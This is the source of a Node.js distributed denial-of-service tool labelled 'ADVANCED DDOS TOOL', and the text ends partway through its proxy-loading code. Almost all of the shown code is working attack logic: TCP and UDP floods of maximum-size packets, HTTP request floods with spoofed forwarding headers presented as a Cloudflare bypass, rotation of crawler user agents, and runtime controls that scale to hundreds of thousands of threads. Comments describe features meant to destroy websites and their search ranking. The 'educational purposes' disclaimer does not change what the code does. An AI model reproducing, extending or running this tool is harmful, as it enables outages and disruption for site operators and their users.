/*
* WARNING: This script is provided for educational purposes only.
* Unauthorized usage may be illegal and against the terms of service of your hosting provider.
* The use of this script to attack systems without proper authorization from the owner is STRICTLY PROHIBITED.
*
* ADVANCED DDOS TOOL - Version 2.0
* Features: Multi-layer attacks, intensity control, logging, performance monitoring
*/

const net = require('net');
const dgram = require('dgram');
const https = require('https');
const http = require('http');
const { execSync, spawn } = require('child_process');
const os = require('os');
const dns = require('dns');
const readline = require('readline');
const fs = require('fs');
const path = require('path');
const cluster = require('cluster');

// ==================== CONFIGURATION ====================
const CONFIG = {
    intensity: 'high', // 'low', 'medium', 'high', 'extreme'
    threads: {
        low: { tcp: 5000, udp: 10000, http: 5000, dns: 1000 },
        medium: { tcp: 20000, udp: 40000, http: 20000, dns: 5000 },
        high: { tcp: 100000, udp: 200000, http: 100000, dns: 20000 },
        extreme: { tcp: 500000, udp: 1000000, http: 500000, dns: 100000 }
    },
    packetSize: {
        tcp: 65507,
        udp: 65507,
        http: 8192
    },
    timeouts: {
        socket: 3000,
        http: 5000,
        dns: 2000
    },
    enableLogging: true,
    logFile: 'attack.log',
    enableStats: true,
    autoRetry: true,
    maxRetries: 3,
    useProxy: false,
    proxyList: [],
    proxyFile: 'proxies.txt',
    enableDeIndex: true, // AUTO ENABLE untuk menghancurkan SEO
    enableCrawler: true, // AUTO ENABLE untuk menghancurkan website
    crawlerThreads: 500,
    useWorkers: true,
    workerCount: 0 // 0 = auto (CPU count)
};

// ==================== GLOBAL VARIABLES ====================
const METHODS = [
    'L3-TCP', 'L3-UDP', 'L3-SYN', 'L3-ACK', 'L3-RST', 'L3-FIN',
    'L4-TCP', 'L4-UDP', 'L4-SYN', 'L4-ACK',
    'L5-DNS', 'L5-DNS-AMP',
    'L6-PING', 'L6-ICMP',
    'L7-HTTP', 'L7-HTTPS', 'L7-POST', 'L7-HEAD',
    'BYPASS-STATIC', 'BYPASS-ANTI-DDOS', 'BYPASS-CLOUDFLARE',
    'SLOWLORIS', 'HTTP-FLOOD', 'RUDY',
    'DE-INDEX', 'CRAWLER', 'BOT-CRAWL'
];

const STATS = {};
const STATS_PER_SEC = {};
const STATS_HISTORY = [];
const INTERVALS = [];
const SOCKETS = [];
const WORKERS = [];
const THREAD_POOLS = {
    l3tcp: [],
    l3udp: [],
    l3syn: [],
    l3ack: [],
    l4tcp: [],
    l4udp: [],
    l7http: [],
    l7post: [],
    slowloris: [],
    bypassStatic: [],
    bypassAntiDDoS: [],
    bypassCloudflare: [],
    dns: [],
    dnsAmp: []
};
let ATTACK_RUNNING = false;
let START_TIME = Date.now();
let TOTAL_PACKETS = 0;
let TOTAL_BYTES = 0;
const IS_WINDOWS = os.platform() === 'win32';
const CPU_COUNT = os.cpus().length;
let PROXY_INDEX = 0;
const CRAWLED_URLS = new Set();
const DEINDEX_REQUESTS = [];
let RUNTIME_RL = null;
let CURRENT_TARGET = null;
let CURRENT_PORT = null;

// ==================== RAM MANAGEMENT ====================
const RAM_CONFIG = {
    maxSockets: 50000, // Max sockets in memory (reduced to prevent OOM)
    maxIntervals: 200000, // Max intervals (reduced)
    socketCleanupInterval: 2000, // Cleanup every 2 seconds (more frequent)
    gcInterval: 10000, // Force GC every 10 seconds (more frequent)
    autoScaleEnabled: true,
    rampUpInterval: 10000, // Ramp up every 10 seconds
    rampUpMultiplier: 1.3, // Increase by 30% each time (reduced from 50%)
    maxRampUp: 10, // Max 10x ramp up
    memoryWarningThreshold: 0.75, // 75% of heap used = warning
    memoryCriticalThreshold: 0.85, // 85% of heap used = critical
    emergencyCleanupThreshold: 0.90 // 90% of heap used = emergency
};

let RAMP_UP_COUNT = 0;
let ACTIVE_SOCKET_COUNT = 0;
let MEMORY_PRESSURE_LEVEL = 0; // 0 = normal, 1 = warning, 2 = critical, 3 = emergency
let THROTTLE_MULTIPLIER = 1.0; // Adaptive throttling multiplier

// ==================== RAM MANAGEMENT FUNCTIONS ====================

function getThrottledBatchSize(baseSize) {
    // Apply throttle multiplier to batch size based on memory pressure
    return Math.max(Math.floor(baseSize * 0.1), Math.floor(baseSize * THROTTLE_MULTIPLIER));
}

function checkMemoryPressure() {
    try {
        const memUsage = process.memoryUsage();
        const heapUsed = memUsage.heapUsed;
        const heapTotal = memUsage.heapTotal;
        const heapRatio = heapUsed / heapTotal;
        
        let newLevel = 0;
        let newThrottle = 1.0;
        
        if (heapRatio >= RAM_CONFIG.emergencyCleanupThreshold) {
            newLevel = 3; // Emergency
            newThrottle = 0.3; // Reduce to 30% intensity
        } else if (heapRatio >= RAM_CONFIG.memoryCriticalThreshold) {
            newLevel = 2; // Critical
            newThrottle = 0.5; // Reduce to 50% intensity
        } else if (heapRatio >= RAM_CONFIG.memoryWarningThreshold) {
            newLevel = 1; // Warning
            newThrottle = 0.7; // Reduce to 70% intensity
        }
        
        if (newLevel !== MEMORY_PRESSURE_LEVEL) {
            MEMORY_PRESSURE_LEVEL = newLevel;
            THROTTLE_MULTIPLIER = newThrottle;
            
            if (newLevel > 0) {
                const levelNames = ['', 'WARNING', 'CRITICAL', 'EMERGENCY'];
                console.log(`\n[!] MEMORY ${levelNames[newLevel]}: Heap usage ${(heapRatio * 100).toFixed(1)}% - Throttling to ${(newThrottle * 100).toFixed(0)}%\n`);
                log(`Memory ${levelNames[newLevel]}: ${(heapRatio * 100).toFixed(1)}% used, throttling to ${(newThrottle * 100).toFixed(0)}%`, 'WARN');
            }
        }
        
        return { level: newLevel, ratio: heapRatio, throttle: newThrottle };
    } catch (e) {
        return { level: 0, ratio: 0, throttle: 1.0 };
    }
}

function emergencyCleanup() {
    if (!ATTACK_RUNNING) return;
    
    console.log('\n[!] EMERGENCY CLEANUP: Freeing memory...\n');
    
    // Aggressively clean sockets
    let cleaned = 0;
    const targetSize = Math.floor(RAM_CONFIG.maxSockets * 0.5); // Reduce to 50% of max
    
    while (SOCKETS.length > targetSize) {
        const sock = SOCKETS.shift();
        try {
            if (sock && !sock.destroyed) {
                sock.destroy();
            }
        } catch (e) {}
        cleaned++;
    }
    
    // Remove closed/destroyed sockets
    for (let i = SOCKETS.length - 1; i >= 0; i--) {
        const sock = SOCKETS[i];
        if (!sock || sock.destroyed || (sock.readyState && sock.readyState === 'closed')) {
            SOCKETS.splice(i, 1);
            cleaned++;
        }
    }
    
    // Clear old stats history
    if (STATS_HISTORY.length > 50) {
        STATS_HISTORY.splice(0, STATS_HISTORY.length - 50);
    }
    
    // Clear old crawled URLs
    if (CRAWLED_URLS.size > 10000) {
        const urls = Array.from(CRAWLED_URLS);
        CRAWLED_URLS.clear();
        urls.slice(-5000).forEach(url => CRAWLED_URLS.add(url));
    }
    
    // Force GC if available
    if (global.gc) {
        global.gc();
    }
    
    ACTIVE_SOCKET_COUNT = SOCKETS.length;
    console.log(`[+] Emergency cleanup: Removed ${cleaned} sockets. Active: ${SOCKETS.length}\n`);
}

function cleanupOldSockets() {
    if (!ATTACK_RUNNING) return;
    
    // Check memory pressure first
    const memStatus = checkMemoryPressure();
    
    // Emergency cleanup if needed
    if (memStatus.level >= 3) {
        emergencyCleanup();
        return;
    }
    
    // Remove destroyed/closed sockets
    const before = SOCKETS.length;
    for (let i = SOCKETS.length - 1; i >= 0; i--) {
        const sock = SOCKETS[i];
        if (!sock || sock.destroyed || (sock.readyState && sock.readyState === 'closed')) {
            SOCKETS.splice(i, 1);
        }
    }
    
    // Limit socket array size (more aggressive if memory pressure)
    const maxSockets = memStatus.level > 0 
        ? Math.floor(RAM_CONFIG.maxSockets * (1 - memStatus.level * 0.2))
        : RAM_CONFIG.maxSockets;
    
    if (SOCKETS.length > maxSockets) {
        const excess = SOCKETS.length - maxSockets;
        for (let i = 0; i < excess; i++) {
            const sock = SOCKETS.shift();
            try {
                if (sock && !sock.destroyed) {
                    sock.destroy();
                }
            } catch (e) {}
        }
    }
    
    ACTIVE_SOCKET_COUNT = SOCKETS.length;
    
    // Only log if significant cleanup happened
    if (before - SOCKETS.length > 100) {
        log(`Cleaned up ${before - SOCKETS.length} old sockets. Active: ${SOCKETS.length}`, 'INFO');
    }
}

function forceGarbageCollection() {
    if (!ATTACK_RUNNING) return;
    
    try {
        // Check memory pressure first
        const memStatus = checkMemoryPressure();
        
        // More aggressive cleanup if memory pressure
        const historyLimit = memStatus.level > 0 ? 50 : 100;
        const urlLimit = memStatus.level > 0 ? 10000 : 50000;
        const urlKeep = memStatus.level > 0 ? 5000 : 10000;
        
        // Clear old stats history
        if (STATS_HISTORY.length > historyLimit) {
            STATS_HISTORY.splice(0, STATS_HISTORY.length - historyLimit);
        }
        
        // Clear old crawled URLs if too many
        if (CRAWLED_URLS.size > urlLimit) {
            const urls = Array.from(CRAWLED_URLS);
            CRAWLED_URLS.clear();
            // Keep only recent URLs
            urls.slice(-urlKeep).forEach(url => CRAWLED_URLS.add(url));
        }
        
        // Force GC if available
        if (global.gc) {
            global.gc();
            if (memStatus.level > 0) {
                log(`Garbage collection forced (Memory: ${(memStatus.ratio * 100).toFixed(1)}%)`, 'INFO');
            }
        }
        
        cleanupOldSockets();
    } catch (e) {
        // Silent fail
    }
}

function autoScaleThreads() {
    if (!ATTACK_RUNNING || !RAM_CONFIG.autoScaleEnabled) return;
    if (RAMP_UP_COUNT >= RAM_CONFIG.maxRampUp) return;
    
    // Check memory pressure - don't scale if memory is critical or emergency
    const memStatus = checkMemoryPressure();
    if (memStatus.level >= 2) {
        console.log(`\n[!] AUTO-SCALING: Skipped due to memory pressure (${(memStatus.ratio * 100).toFixed(1)}%)\n`);
        return;
    }
    
    RAMP_UP_COUNT++;
    const multiplier = Math.pow(RAM_CONFIG.rampUpMultiplier, RAMP_UP_COUNT);
    
    // Apply throttle multiplier if memory warning
    const effectiveMultiplier = memStatus.level > 0 
        ? multiplier * THROTTLE_MULTIPLIER 
        : multiplier;
    
    console.log(`\n[!] AUTO-SCALING: Ramping up threads (${RAMP_UP_COUNT}/${RAM_CONFIG.maxRampUp})...`);
    console.log(`[!] Adding threads with ${(effectiveMultiplier * 100).toFixed(0)}% multiplier`);
    if (memStatus.level > 0) {
        console.log(`[!] Memory pressure: ${(memStatus.ratio * 100).toFixed(1)}% - Throttled to ${(THROTTLE_MULTIPLIER * 100).toFixed(0)}%\n`);
    } else {
        console.log('');
    }
    
    if (CURRENT_TARGET && CURRENT_PORT) {
        // Add more TCP threads (reduced limits to prevent OOM)
        const tcpThreads = Math.floor(5000 * effectiveMultiplier);
        for (let i = 0; i < tcpThreads && THREAD_POOLS.l3tcp.length < 500000; i++) {
            const id = startSingleTCPThread(CURRENT_TARGET, CURRENT_PORT);
            if (id) THREAD_POOLS.l3tcp.push(id);
        }
        
        // Add more UDP threads
        const udpThreads = Math.floor(10000 * effectiveMultiplier);
        for (let i = 0; i < udpThreads && THREAD_POOLS.l3udp.length < 1000000; i++) {
            const id = startSingleUDPThread(CURRENT_TARGET, CURRENT_PORT);
            if (id) THREAD_POOLS.l3udp.push(id);
        }
    }
    
    if (CURRENT_TARGET) {
        // Add more HTTP threads
        const httpThreads = Math.floor(5000 * effectiveMultiplier);
        for (let i = 0; i < httpThreads && THREAD_POOLS.l7http.length < 500000; i++) {
            const id = startSingleHTTPThread(CURRENT_TARGET);
            if (id) THREAD_POOLS.l7http.push(id);
        }
        
        // Add more Cloudflare bypass threads
        const cfThreads = Math.floor(25000 * effectiveMultiplier);
        for (let i = 0; i < cfThreads && THREAD_POOLS.bypassCloudflare.length < 1000000; i++) {
            const id = startSingleCFThread(CURRENT_TARGET);
            if (id) THREAD_POOLS.bypassCloudflare.push(id);
        }
    }
    
    console.log(`[+] Auto-scaled: TCP=${THREAD_POOLS.l3tcp.length.toLocaleString()}, UDP=${THREAD_POOLS.l3udp.length.toLocaleString()}, HTTP=${THREAD_POOLS.l7http.length.toLocaleString()}, CF=${THREAD_POOLS.bypassCloudflare.length.toLocaleString()}\n`);
}

function startRAMManagement() {
    if (!ATTACK_RUNNING) return;
    
    // Socket cleanup interval
    const socketCleanup = setInterval(() => {
        if (!ATTACK_RUNNING) {
            clearInterval(socketCleanup);
            return;
        }
        cleanupOldSockets();
    }, RAM_CONFIG.socketCleanupInterval);
    INTERVALS.push(socketCleanup);
    
    // Garbage collection interval
    const gcInterval = setInterval(() => {
        if (!ATTACK_RUNNING) {
            clearInterval(gcInterval);
            return;
        }
        forceGarbageCollection();
    }, RAM_CONFIG.gcInterval);
    INTERVALS.push(gcInterval);
    
    // Memory pressure monitoring (check every 2 seconds)
    const memoryMonitor = setInterval(() => {
        if (!ATTACK_RUNNING) {
            clearInterval(memoryMonitor);
            return;
        }
        checkMemoryPressure();
    }, 2000);
    INTERVALS.push(memoryMonitor);
    
    // Auto-scaling ramp up
    if (RAM_CONFIG.autoScaleEnabled) {
        const rampUp = setInterval(() => {
            if (!ATTACK_RUNNING) {
                clearInterval(rampUp);
                return;
            }
            autoScaleThreads();
        }, RAM_CONFIG.rampUpInterval);
        INTERVALS.push(rampUp);
    }
}

// ==================== UTILITY FUNCTIONS ====================

function randomIp() {
    return `${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}`;
}

function randomString(length = 10) {
    return Math.random().toString(36).substring(2, 2 + length);
}

function randomPort() {
    return Math.floor(Math.random() * 65535) + 1;
}

function getIntensityMultiplier() {
    const multipliers = { low: 2, medium: 5, high: 15, extreme: 30 };
    return multipliers[CONFIG.intensity] || 15;
}

// ==================== RUNTIME THREAD MANAGEMENT ====================

function adjustThreads(poolName, newCount) {
    const pool = THREAD_POOLS[poolName];
    if (!pool) return;
    
    const current = pool.length;
    if (newCount > current) {
        // Add threads
        const diff = newCount - current;
        console.log(`[THREAD] Adding ${diff} threads to ${poolName}...`);
        // Threads akan ditambahkan oleh fungsi attack yang sesuai
    } else if (newCount < current) {
        // Remove threads
        const diff = current - newCount;
        console.log(`[THREAD] Removing ${diff} threads from ${poolName}...`);
        for (let i = 0; i < diff && pool.length > 0; i++) {
            const intervalId = pool.pop();
            try {
                clearInterval(intervalId);
                const idx = INTERVALS.indexOf(intervalId);
                if (idx > -1) INTERVALS.splice(idx, 1);
            } catch (e) {}
        }
    }
}

function showRuntimeMenu() {
    if (!RUNTIME_RL || !ATTACK_RUNNING) return;
    
    console.log('\n╔════════════════════════════════════════════════════════════╗');
    console.log('║           RUNTIME THREAD CONTROL MENU                      ║');
    console.log('╠════════════════════════════════════════════════════════════╣');
    console.log('║ Commands:                                                  ║');
    console.log('║  +tcp <num>    - Increase TCP threads                      ║');
    console.log('║  +udp <num>    - Increase UDP threads                      ║');
    console.log('║  +http <num>   - Increase HTTP threads                     ║');
    console.log('║  +cf <num>     - Increase Cloudflare bypass threads        ║');
    console.log('║  -tcp <num>    - Decrease TCP threads                      ║');
    console.log('║  -udp <num>    - Decrease UDP threads                      ║');
    console.log('║  -http <num>   - Decrease HTTP threads                     ║');
    console.log('║  -cf <num>     - Decrease Cloudflare bypass threads        ║');
    console.log('║  threads       - Show current thread pools status            ║');
    console.log('║  pools         - Show current thread pools status            ║');
    console.log('║  max           - Set all threads to maximum (100k each)     ║');
    console.log('║  stop          - Stop all attacks                           ║');
    console.log('║  status        - Show current attack status                 ║');
    console.log('╚════════════════════════════════════════════════════════════╝\n');
}

function handleRuntimeCommand(cmd) {
    if (!ATTACK_RUNNING) {
        console.log('[!] No attack running. Start an attack first.');
        return;
    }
    
    const parts = cmd.trim().split(/\s+/);
    const action = parts[0];
    const value = parseInt(parts[1]) || 0;
    
    switch(action) {
        case '+tcp':
            if (value > 0) {
                let added = 0;
                for (let i = 0; i < value; i++) {
                    if (CURRENT_TARGET && CURRENT_PORT) {
                        const id = startSingleTCPThread(CURRENT_TARGET, CURRENT_PORT);
                        if (id) {
                            THREAD_POOLS.l3tcp.push(id);
                            added++;
                        }
                    }
                }
                console.log(`[+] Added ${added} TCP threads (Total: ${THREAD_POOLS.l3tcp.length})`);
            } else {
                console.log('[!] Please specify number of threads: +tcp <number>');
            }
            break;
        case '+udp':
            if (value > 0) {
                let added = 0;
                for (let i = 0; i < value; i++) {
                    if (CURRENT_TARGET && CURRENT_PORT) {
                        const id = startSingleUDPThread(CURRENT_TARGET, CURRENT_PORT);
                        if (id) {
                            THREAD_POOLS.l3udp.push(id);
                            added++;
                        }
                    }
                }
                console.log(`[+] Added ${added} UDP threads (Total: ${THREAD_POOLS.l3udp.length})`);
            } else {
                console.log('[!] Please specify number of threads: +udp <number>');
            }
            break;
        case '+http':
            if (value > 0) {
                let added = 0;
                for (let i = 0; i < value; i++) {
                    if (CURRENT_TARGET) {
                        const id = startSingleHTTPThread(CURRENT_TARGET);
                        if (id) {
                            THREAD_POOLS.l7http.push(id);
                            added++;
                        }
                    }
                }
                console.log(`[+] Added ${added} HTTP threads (Total: ${THREAD_POOLS.l7http.length})`);
            } else {
                console.log('[!] Please specify number of threads: +http <number>');
            }
            break;
        case '+cf':
            if (value > 0) {
                let added = 0;
                for (let i = 0; i < value; i++) {
                    if (CURRENT_TARGET) {
                        const id = startSingleCFThread(CURRENT_TARGET);
                        if (id) {
                            THREAD_POOLS.bypassCloudflare.push(id);
                            added++;
                        }
                    }
                }
                console.log(`[+] Added ${added} Cloudflare bypass threads (Total: ${THREAD_POOLS.bypassCloudflare.length})`);
            } else {
                console.log('[!] Please specify number of threads: +cf <number>');
            }
            break;
        case '-tcp':
            if (value > 0) {
                let removed = 0;
                for (let i = 0; i < value && THREAD_POOLS.l3tcp.length > 0; i++) {
                    const id = THREAD_POOLS.l3tcp.pop();
                    try {
                        clearInterval(id);
                        const idx = INTERVALS.indexOf(id);
                        if (idx > -1) INTERVALS.splice(idx, 1);
                        removed++;
                    } catch (e) {}
                }
                console.log(`[-] Removed ${removed} TCP threads (Remaining: ${THREAD_POOLS.l3tcp.length})`);
            } else {
                console.log('[!] Please specify number of threads: -tcp <number>');
            }
            break;
        case '-udp':
            if (value > 0) {
                let removed = 0;
                for (let i = 0; i < value && THREAD_POOLS.l3udp.length > 0; i++) {
                    const id = THREAD_POOLS.l3udp.pop();
                    try {
                        clearInterval(id);
                        const idx = INTERVALS.indexOf(id);
                        if (idx > -1) INTERVALS.splice(idx, 1);
                        removed++;
                    } catch (e) {}
                }
                console.log(`[-] Removed ${removed} UDP threads (Remaining: ${THREAD_POOLS.l3udp.length})`);
            } else {
                console.log('[!] Please specify number of threads: -udp <number>');
            }
            break;
        case '-http':
            if (value > 0) {
                let removed = 0;
                for (let i = 0; i < value && THREAD_POOLS.l7http.length > 0; i++) {
                    const id = THREAD_POOLS.l7http.pop();
                    try {
                        clearInterval(id);
                        const idx = INTERVALS.indexOf(id);
                        if (idx > -1) INTERVALS.splice(idx, 1);
                        removed++;
                    } catch (e) {}
                }
                console.log(`[-] Removed ${removed} HTTP threads (Remaining: ${THREAD_POOLS.l7http.length})`);
            } else {
                console.log('[!] Please specify number of threads: -http <number>');
            }
            break;
        case '-cf':
            if (value > 0) {
                let removed = 0;
                for (let i = 0; i < value && THREAD_POOLS.bypassCloudflare.length > 0; i++) {
                    const id = THREAD_POOLS.bypassCloudflare.pop();
                    try {
                        clearInterval(id);
                        const idx = INTERVALS.indexOf(id);
                        if (idx > -1) INTERVALS.splice(idx, 1);
                        removed++;
                    } catch (e) {}
                }
                console.log(`[-] Removed ${removed} Cloudflare bypass threads (Remaining: ${THREAD_POOLS.bypassCloudflare.length})`);
            } else {
                console.log('[!] Please specify number of threads: -cf <number>');
            }
            break;
        case 'threads':
        case 'thread':
        case 'pools':
            showThreadPools();
            break;
        case 'max':
            console.log('[!] Setting all threads to MAXIMUM...');
            if (CURRENT_TARGET && CURRENT_PORT) {
                const maxThreads = 100000;
                console.log(`[!] Adding ${maxThreads} threads for each type...`);
                
                // Add massive threads
                for (let i = 0; i < maxThreads; i++) {
                    if (CURRENT_TARGET && CURRENT_PORT) {
                        const id1 = startSingleTCPThread(CURRENT_TARGET, CURRENT_PORT);
                        if (id1) THREAD_POOLS.l3tcp.push(id1);
                        
                        const id2 = startSingleUDPThread(CURRENT_TARGET, CURRENT_PORT);
                        if (id2) THREAD_POOLS.l3udp.push(id2);
                    }
                    if (CURRENT_TARGET) {
                        const id3 = startSingleHTTPThread(CURRENT_TARGET);
                        if (id3) THREAD_POOLS.l7http.push(id3);
                        
                        const id4 = startSingleCFThread(CURRENT_TARGET);
                        if (id4) THREAD_POOLS.bypassCloudflare.push(id4);
                    }
                }
                console.log(`[!] MAXIMUM threads activated!`);
                showThreadPools();
            }
            break;
        case 'stop':
            console.log('[!] Stopping all attacks...');
            cleanup();
            break;
        case 'status':
            if (CURRENT_TARGET && CURRENT_PORT) {
                logStatus(CURRENT_TARGET, CURRENT_PORT);
            }
            break;
        default:
            console.log('[?] Unknown command. Type "commands" or "help" for help.');
    }
}

function showThreadPools() {
    if (!ATTACK_RUNNING) return;
    
    console.log('\n╔════════════════════════════════════════════════════════════╗');
    console.log('║              CURRENT THREAD POOLS STATUS                 ║');
    console.log('╠════════════════════════════════════════════════════════════╣');
    console.log(`║ L3-TCP Threads          : ${THREAD_POOLS.l3tcp.length.toLocaleString()}`.padEnd(60) + '║');
    console.log(`║ L3-UDP Threads          : ${THREAD_POOLS.l3udp.length.toLocaleString()}`.padEnd(60) + '║');
    console.log(`║ L3-SYN Threads         : ${THREAD_POOLS.l3syn.length.toLocaleString()}`.padEnd(60) + '║');
    console.log(`║ L3-ACK Threads         : ${THREAD_POOLS.l3ack.length.toLocaleString()}`.padEnd(60) + '║');
    console.log(`║ L4-TCP Threads         : ${THREAD_POOLS.l4tcp.length.toLocaleString()}`.padEnd(60) + '║');
    console.log(`║ L4-UDP Threads         : ${THREAD_POOLS.l4udp.length.toLocaleString()}`.padEnd(60) + '║');
    console.log(`║ L7-HTTP Threads        : ${THREAD_POOLS.l7http.length.toLocaleString()}`.padEnd(60) + '║');
    console.log(`║ Slowloris Threads      : ${THREAD_POOLS.slowloris.length.toLocaleString()}`.padEnd(60) + '║');
    console.log(`║ Bypass Static Threads   : ${THREAD_POOLS.bypassStatic.length.toLocaleString()}`.padEnd(60) + '║');
    console.log(`║ Bypass Anti-DDoS       : ${THREAD_POOLS.bypassAntiDDoS.length.toLocaleString()}`.padEnd(60) + '║');
    console.log(`║ Bypass Cloudflare      : ${THREAD_POOLS.bypassCloudflare.length.toLocaleString()}`.padEnd(60) + '║');
    console.log(`║ DNS Threads            : ${THREAD_POOLS.dns.length.toLocaleString()}`.padEnd(60) + '║');
    console.log(`║ DNS Amplification      : ${THREAD_POOLS.dnsAmp.length.toLocaleString()}`.padEnd(60) + '║');
    
    const totalThreads = Object.values(THREAD_POOLS).reduce((sum, pool) => sum + pool.length, 0);
    console.log(`╠════════════════════════════════════════════════════════════╣`);
    console.log(`║ TOTAL ACTIVE THREADS   : ${totalThreads.toLocaleString()}`.padEnd(60) + '║');
    console.log(`║ TOTAL INTERVALS       : ${INTERVALS.length.toLocaleString()}`.padEnd(60) + '║');
    console.log(`║ TOTAL SOCKETS         : ${SOCKETS.length.toLocaleString()}`.padEnd(60) + '║');
    console.log('╚════════════════════════════════════════════════════════════╝\n');
}

function startSingleTCPThread(target, port) {
    const intervalId = setInterval(() => {
        if (!ATTACK_RUNNING) {
            clearInterval(intervalId);
            return;
        }
        try {
            // Apply throttle based on memory pressure
            const batchSize = getThrottledBatchSize(1000);
            for (let i = 0; i < batchSize; i++) {
                if (!ATTACK_RUNNING) break;
                const sock = new net.Socket();
                sock.setTimeout(500);
                sock.setNoDelay(true);
                sock.connect(port, target, () => {
                    sock.write(Buffer.alloc(CONFIG.packetSize.tcp, randomString()));
                    sock.write(Buffer.alloc(CONFIG.packetSize.tcp, randomString()));
                    sock.end();
                });
                sock.on('error', () => { 
                    try { 
                        sock.destroy(); 
                        // Auto-remove from SOCKETS array after destroy
                        const idx = SOCKETS.indexOf(sock);
                        if (idx > -1) SOCKETS.splice(idx, 1);
                    } catch {} 
                });
                sock.on('timeout', () => { 
                    try { 
                        sock.destroy(); 
                        // Auto-remove from SOCKETS array after destroy
                        const idx = SOCKETS.indexOf(sock);
                        if (idx > -1) SOCKETS.splice(idx, 1);
                    } catch {} 
                });
                sock.on('close', () => {
                    // Auto-remove from SOCKETS array on close
                    const idx = SOCKETS.indexOf(sock);
                    if (idx > -1) SOCKETS.splice(idx, 1);
                });
                // Only push if under limit
                if (SOCKETS.length < RAM_CONFIG.maxSockets) {
                    SOCKETS.push(sock);
                } else {
                    // Destroy immediately if at limit
                    try { sock.destroy(); } catch {}
                }
            }
            STATS["L3-TCP"] = (STATS["L3-TCP"] || 0) + batchSize;
            TOTAL_PACKETS += batchSize;
            TOTAL_BYTES += batchSize * CONFIG.packetSize.tcp * 2;
        } catch (e) {}
    }, 1);
    INTERVALS.push(intervalId);
    return intervalId;
}

function startSingleUDPThread(target, port) {
    const client = dgram.createSocket('udp4');
    SOCKETS.push(client);
    const intervalId = setInterval(() => {
        if (!ATTACK_RUNNING) {
            clearInterval(intervalId);
            try { client.close(); } catch {}
            return;
        }
        try {
            // Apply throttle based on memory pressure
            const batchSize = getThrottledBatchSize(2000);
            for (let i = 0; i < batchSize; i++) {
                if (!ATTACK_RUNNING) break;
                const msg = Buffer.alloc(CONFIG.packetSize.udp, randomString());
                client.send(msg, 0, msg.length, port, target, () => {});
                client.send(msg, 0, msg.length, port, target, () => {});
            }
            STATS["L3-UDP"] = (STATS["L3-UDP"] || 0) + batchSize * 2;
            TOTAL_PACKETS += batchSize * 2;
            TOTAL_BYTES += batchSize * CONFIG.packetSize.udp * 2;
        } catch (e) {}
    }, 1);
    INTERVALS.push(intervalId);
    return intervalId;
}

function startSingleHTTPThread(target) {
    if (!target.startsWith('http://') && !target.startsWith('https://')) return null;
    const intervalId = setInterval(() => {
        if (!ATTACK_RUNNING) {
            clearInterval(intervalId);
            return;
        }
        try {
            // Apply throttle based on memory pressure
            const batchSize = getThrottledBatchSize(1000);
            for (let i = 0; i < batchSize; i++) {
                if (!ATTACK_RUNNING) break;
                const opts = {
                    method: 'GET',
                    timeout: 1000,
                    headers: {
                        'User-Agent': getRandomUserAgent(),
                        'Accept': '*/*',
                        'X-Forwarded-For': randomIp(),
                        'Connection': 'close'
                    }
                };
                const mod = target.startsWith('https:') ? https : http;
                const req = mod.request(target, opts, res => {
                    res.on('data', () => {});
                    res.on('end', () => {});
                });
                req.on('error', () => {});
                req.setTimeout(1000, () => { try { req.destroy(); } catch {} });
                req.end();
            }
            STATS["L7-HTTP"] = (STATS["L7-HTTP"] || 0) + batchSize;
            TOTAL_PACKETS += batchSize;
        } catch (e) {}
    }, 1);
    INTERVALS.push(intervalId);
    return intervalId;
}

function startSingleCFThread(target) {
    if (!target.startsWith('http://') && !target.startsWith('https://')) return null;
    const cfPaths = ['', '/', '/index.html', '/api', '/admin'];
    const intervalId = setInterval(() => {
        if (!ATTACK_RUNNING) {
            clearInterval(intervalId);
            return;
        }
        try {
            // Apply throttle based on memory pressure
            const batchSize = getThrottledBatchSize(2000);
            for (let i = 0; i < batchSize; i++) {
                if (!ATTACK_RUNNING) break;
                const path = cfPaths[Math.floor(Math.random() * cfPaths.length)];
                const url = target.replace(/\/$/, '') + path;
                const opts = {
                    method: 'GET',
                    timeout: 1000,
                    headers: {
                        'User-Agent': getRandomUserAgent(),
                        'CF-Connecting-IP': randomIp(),
                        'CF-IPCountry': 'US',
                        'Connection': 'close'
                    }
                };
                const mod = url.startsWith('https:') ? https : http;
                const req = mod.request(url, opts, res => {
                    res.on('data', () => {});
                    res.on('end', () => {});
                });
                req.on('error', () => {});
                req.setTimeout(1000, () => { try { req.destroy(); } catch {} });
                req.end();
            }
            STATS["BYPASS-CLOUDFLARE"] = (STATS["BYPASS-CLOUDFLARE"] || 0) + batchSize;
            TOTAL_PACKETS += batchSize;
        } catch (e) {}
    }, 1);
    INTERVALS.push(intervalId);
    return intervalId;
}

function getUserAgents() {
    return [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:121.0) Gecko/20100101 Firefox/121.0',
        'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1',
        'Mozilla/5.0 (Android 13; Mobile; rv:121.0) Gecko/121.0 Firefox/121.0',
        'Googlebot/2.1 (+http://www.google.com/bot.html)',
        'Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)',
        'curl/7.88.1',
        'Wget/1.21.3'
    ];
}

function getRandomUserAgent() {
    const agents = getUserAgents();
    return agents[Math.floor(Math.random() * agents.length)];
}

function getRandomReferer() {
    const referers = [
        'https://www.google.com/',
        'https://www.google.com/search?q=' + randomString(),
        'https://www.facebook.com/',
        'https://twitter.com/',
        'https://www.reddit.com/',
        'https://www.youtube.com/',
        'https://www.bing.com/',
        'https://duckduckgo.com/'
    ];
    return referers[Math.floor(Math.random() * referers.length)];
}

// ==================== PROXY FUNCTIONS ====================

function loadProxies() {
    if (!CONFIG.useProxy) return;
    
    try {
        if (fs.existsSync(CONFIG.proxyFile)) {
            const content = fs.readFileSync(CONFIG.proxyFile, 'utf8');
